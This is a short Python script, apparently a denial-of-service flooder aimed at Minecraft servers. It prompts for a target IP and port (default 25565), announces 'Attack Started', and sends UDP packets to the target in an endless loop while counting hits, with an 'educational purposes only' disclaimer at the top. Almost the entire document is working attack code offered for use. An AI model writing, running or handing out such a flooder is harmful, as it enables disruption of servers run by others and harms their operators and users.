import socket
import os
import sys
os.system("clear")
print
print("Warning!!!! This Script is not joke and it is for educational purposes only, I'm not responsible for any damage caused by this script")

print("To insert the default port write 0")

ip = input('IP >> ')

port = int(input('Port (Default: 25565) >> '))

if port == 0:

      port = 25565
print("Attack Started ☢️")

print("Use CTRL+C to stop the Attack")
h = 0
while True:
   h = h+1
   print("Total Hits --> ", h )
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

   s.connect((ip, port))

   i = 0

   if i < 10:

      s.send(b'\x01')
